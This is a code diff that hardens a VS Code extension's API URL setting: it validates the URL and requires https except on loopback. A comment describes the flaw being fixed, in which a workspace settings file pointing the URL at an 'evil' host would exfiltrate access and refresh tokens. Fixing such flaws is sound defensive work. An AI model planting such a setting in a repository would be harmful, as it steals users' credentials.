@@ -3,6 +3,8 @@ import * as vscode from 'vscode';
 
 const CONFIG_SECTION = 'waitlayer';
 
+const DEFAULT_API_URL = 'https://api.waitlayer.com/api/v1';
+
 export class ConfigurationManager {
   private readonly secrets: vscode.SecretStorage;
   private deviceKey = 'waitlayer.deviceFingerprint';
@@ -37,10 +39,37 @@ export class ConfigurationManager {
     // user who installs the extension can reach the real API without manual
     // configuration. Local development overrides via the `waitlayer.apiUrl`
     // setting (A-013).
-    return (
-      vscode.workspace.getConfiguration(CONFIG_SECTION).get<string>('apiUrl') ||
-      'https://api.waitlayer.com/api/v1'
-    );
+    //
+    // The override is VALIDATED, not trusted. This extension sends a WaitLayer
+    // access token from SecretStorage to whatever origin this returns, and the
+    // setting used to be plain `window` scope — so a repository containing
+    // `.vscode/settings.json` with `{"waitlayer.apiUrl": "https://evil/api/v1"}`
+    // repointed it the moment the folder was opened, exfiltrating the access
+    // and refresh tokens. `scope: machine` in package.json now stops workspace
+    // values being read at all; this check is the second line, because a
+    // setting that carries a credential should not be trusted on scope alone.
+    const configured = vscode.workspace.getConfiguration(CONFIG_SECTION).get<string>('apiUrl');
+    if (!configured) return DEFAULT_API_URL;
+
+    let parsed: URL;
+    try {
+      parsed = new URL(configured);
+    } catch {
+      console.error(`[WaitLayer] Ignoring malformed waitlayer.apiUrl: ${configured}`);
+      return DEFAULT_API_URL;
+    }
+
+    // Plain HTTP is allowed only for loopback, where there is no network to
+    // intercept. Anything else must be TLS.
+    const isLoopback = ['localhost', '127.0.0.1', '::1', '[::1]'].includes(parsed.hostname);
+    if (parsed.protocol !== 'https:' && !(parsed.protocol === 'http:' && isLoopback)) {
+      console.error(
+        `[WaitLayer] Ignoring insecure waitlayer.apiUrl (${parsed.protocol}//${parsed.host}); ` +
+          'only https, or http on loopback, is accepted.',
+      );
+      return DEFAULT_API_URL;
+    }
+    return configured;
   }
 
   /**
